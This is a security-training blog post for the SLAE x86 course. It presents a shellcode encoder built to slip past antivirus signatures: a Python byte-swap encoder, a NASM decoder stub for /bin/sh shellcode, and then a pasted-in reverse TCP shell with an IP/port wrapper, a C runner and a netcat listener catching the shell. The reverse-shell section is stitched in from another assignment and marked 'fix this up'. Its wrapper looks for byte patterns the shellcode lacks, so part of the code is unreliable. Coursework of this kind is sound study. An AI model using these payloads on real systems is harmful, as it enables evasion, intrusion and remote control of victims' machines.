---
title:  "SLAE x86 Assignment 4: Custom Encoder"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
#categories:
#  - exploit dev
classes: wide
#tags:
#  - exploit dev
#  - slae
---

![Shellcoding](/assets/images/slae32.png)

### Custom Encoder
------

* Create a custom encoding scheme such as the 'Insertion Encoder' exhibited in the course
* POC with the execve-stack shellcode to encode the schema and execute

#### Concept 
-----

Shellcode encoders are typically used as a technique to evade Anti-Virus security controls. An Encoder comes in handy when deploying malicious payloads onto a system, the encoder's main objective is to obfuscate the shellcode to avoid signature detection.

Note the Encoder is founded on the principle of an encoding scheme, which relates to security through obscurity. Not to be confused with encryption via the use of an encryption key, when obfuscated it is possible to reverse the encoding scheme found within the source code.

For the purpose of this POC, a simplistic Insertion encoding scheme will be used whereby 2 consecutive bytes will be swopped around within a 4 byte segment. 

A true Insertion Encoder would insert junk data with more complex algorithms to obfuscate the original shellcode, this encoding scheme will serve the same purpose and allow for a simpler explanation and interpretation. 

![Encoder](/assets/images/encoder.jpg)

#### Insertion Encoder in Python
--------

The execve-stack shellcode from the course material will be used as a reference for the shellcode, the shellcode will spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell:

```bash
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

The following Python code will be used as a shellcode wrapper to generate the obfuscated shellcode from the original shellcode: 

```python
#!/usr/bin/python

# Filename: encoder.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate obfuscated shellcode from the original shellcode
# Usage: python encoder.py 

#execve-stack shellcode to spawn /bin/sh shell
shellcode = "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f"
shellcode += "\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

print 'Shellcode length: %d bytes\n'  % len(shellcode)
s2 = ''

for x in bytearray(shellcode):
    s2 += '0x%02x,' % x

s2 = s2.rstrip(',')
print 'Original shellcode:'
print s2
print '\nObfuscated shellcode:'

s2n = s2.split(',')
encoded = ''
i = 1
for s in s2n:
    if i == 1:
        a = s
    elif i == 2:
        encoded += '%s,' % s
        encoded += '%s,' % a
        i = 1
        continue
    i += 1

print encoded.rstrip(',')
```

The Python code generates the obfuscated shellcode in hex format based on the hardcoded original shellcode, calculating the shellcode length:

```bash
osboxes@osboxes:~/Downloads/SLAE$ python encoder.py 
Shellcode length: 30 bytes

Original shellcode:
0x31,0xc0,0x50,0x68,0x62,0x61,0x73,0x68,0x68,0x62,0x69,0x6e,0x2f,0x68,0x2f,0x2f,0x2f,0x2f,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80

Obfuscated shellcode:
0xc0,0x31,0x68,0x50,0x61,0x62,0x68,0x73,0x62,0x68,0x6e,0x69,0x68,0x2f,0x2f,0x2f,0x2f,0x2f,0xe3,0x89,0x89,0x50,0x53,0xe2,0xe1,0x89,0x0b,0xb0,0x80,0xcd
osboxes@osboxes:~/Downloads/SLAE$ 
```

#### Assembly Code
-------------

The Assembly code will consist of the the following components:

* Encoded shellcode
* Decoder stub (Loop through the sequence of bytes 15 times - as the encoded shellcode is 30 bytes in length)
* Decoded shellcode
* Execution of decoded shellcode

````nasm
; Filename: enocder.nasm
; Author: h3ll0clar1c3
; Purpose: Decode the encoded shellcode and execute
; Compilation: ./compile.sh encoder
; Usage: ./encoder
; Shellcode size: 60 bytes
; Architecture: x86

global   _start

section .text
        _start:

        ; jump to encoded shellcode
        jmp short call_shellcode

        decoder:
        pop esi                         ; put address to EncodedShellcode into ESI (jmp-call-pop)
        xor eax, eax                    ; clear eax register (data)
        xor ecx, ecx                    ; clear ecx register (loop counter)
        mov cl, 15                      ; loop 15 times (shellcode is 30 bytes in length)

        decode:
        ; switch data between esi and esi+1
        mov  al, byte [esi]
        xchg byte [esi+1], al
        mov [esi], al

        ; loop through each of the 2 bytes within the 4 byte segment and decode
        add esi, 2
        loop decode

        ; jump to decoded shellcode
        jmp short EncodedShellcode

        call_shellcode:
        call decoder
        EncodedShellcode: db 0xc0,0x31,0x68,0x50,0x61,0x62,0x68,0x73,0x62,0x68,0x6e,0x69,0x68,0x2f,0x2f,0x2f,0x2f        	                     ,0x2f,0xe3,0x89,0x89,0x50,0x53,0xe2,0xe1,0x89,0x0b,0xb0,0x80,0xcd                                                             
````

The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
```
The Assembly code compiled as an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh encoder
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

#### Customize Shellcode
------
fix this up ... 
Objdump is used to extract the shellcode from the Reverse TCP shell in hex format (Null free):

```bash
osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./encoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x88\x44\x24\x0b\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

Once the raw shellcode has been extracted, the last requirement to complete the assignment is to ensure the IP address and port number are easily configurable. 

This can be achieved by utilising a Python wrapper which XOR's the given IP address with a key, and takes a standard 2 byte port number and checks the chosen port number to ensure the custom port is valid.

The shellcode variable defined within the script includes the original hardcoded shellcode for port 4444:

```python 
#!/usr/bin/python

# Filename: reverse_shell_tcp_wrapper.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate dynamic shellcode, configurable IP address and port number
# Usage: python reverse_shell_tcp_wrapper.py <IP address> <port>

import socket
import sys
import struct

shellcode = """
\\x31\\xc0\\x31\\xdb\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xbf\\xff
\\xff\\xff\\xff\\x81\\xf7\\x80\\xff\\xff\\xfe\\x57\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x16
\\x51\\x52\\xb0\\x66\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x89\\xd3\\x49\\xb0\\x3f\\xcd\\x80
\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x88\\x44\\x24\\x0b\\x89\\xe3
\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80
"""

if (len(sys.argv) < 3):
    print "Usage: python {name} <IP address> <port>".format(name = sys.argv[0])
    exit()

ip = socket.inet_aton(sys.argv[1])

# Find valid XOR byte
xor_byte = 0
for i in range(1, 256):
    matched_a_byte = False
    for octet in ip:
        if i == int(octet.encode('hex'), 16):
            matched_a_byte = True
            break

    if not matched_a_byte:
        xor_byte = i
        break

if xor_byte == 0:
    print 'Failed to find a valid XOR byte!'
    exit(1)

# Inject the XOR bytes
shellcode = shellcode.replace("\\xb8\\xff\\xff\\xff\\xff", "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x = struct.pack('B', xor_byte).encode('hex')))

# IP address
ip_bytes = []
for i in range(0, 4):
    ip_bytes.append(struct.pack('B', int(ip[i].encode('hex'), 16) ^ xor_byte).encode('hex'))

shellcode = shellcode.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\x{b1}\\x{b2}\\x{b3}\\x{b4}".format(
    b1 = ip_bytes[0],
    b2 = ip_bytes[1],
    b3 = ip_bytes[2],
    b4 = ip_bytes[3]
))

# Port
port = int(sys.argv[2])

if port < 0 or port > 65535:
    print "Invalid port number, must be between 0 and 65535!"
    exit()
 
port = hex(socket.htons(int(sys.argv[2])))
shellcode = shellcode.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))

# Execute
print("Generated shellcode using custom IP: " + sys.argv[1] + " and custom port: " + sys.argv[2])
print shellcode

print "Shellcode length: %d bytes" % len(shellcode)
if "\x00" in shellcode:
    print "WARNING: Null byte is present!"
else:
    print "No nulls detected"
```

The Python code dynamically generates shellcode in hex format based on the user input, calculating the shellcode length and checking for Null bytes in the process: 

```bash
osboxes@osboxes:~/Downloads/SLAE/Assignment_2$ python reverse_shell_tcp_wrapper.py 127.0.0.1 5555
Generated shellcode using custom IP: 127.0.0.1 and custom port: 5555

\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff
\xff\xff\xff\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x16
\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80
\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x88\x44\x24\x0b\x89\xe3
\x31\xc9\x31\xd2\xb0\x0b\xcd\x80

Shellcode length: 374 bytes
No nulls detected
```

A simple C program scripted and edited with the newly generated shellcode:

```c
/**
* Filename: shellcode.c
* Author: h3ll0clar1c3
* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 5555  
* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final  
* Usage: ./reverse_shell_tcp_final
* Testing: nc -lv 5555
* Shellcode size: 92 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

int main(void)
{
unsigned char code[] =
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff"
"\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03"
"\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73"
"\x68\x68\x2f\x2f\x62\x69\x88\x44\x24\x0b\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
    printf("Shellcode length: %d bytes\n", strlen(code));

    void (*s)() = (void *)code;
    s();

    return 0;
}
```

#### POC (Final Shellcode) 
------

The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 92 bytes:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final
osboxes@osboxes:~/Downloads/SLAE$ ./reverse_shell_tcp_final
Shellcode length: 92 bytes

```

A separate terminal demonstrating a successful reverse connection and shell on the local host (via port 5555):

```bash
osboxes@osboxes:~$ nc -lv 5555
Connection from 127.0.0.1 port 5555 [tcp/*] accepted
id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

##### SLAE Disclaimer ####
---------

This blog post has been created for completing the requirements of the [SLAE certification] [slae-link].

Student ID: PA-14936

GitHub Repo: [Code][github-code]

[slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
[github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment4
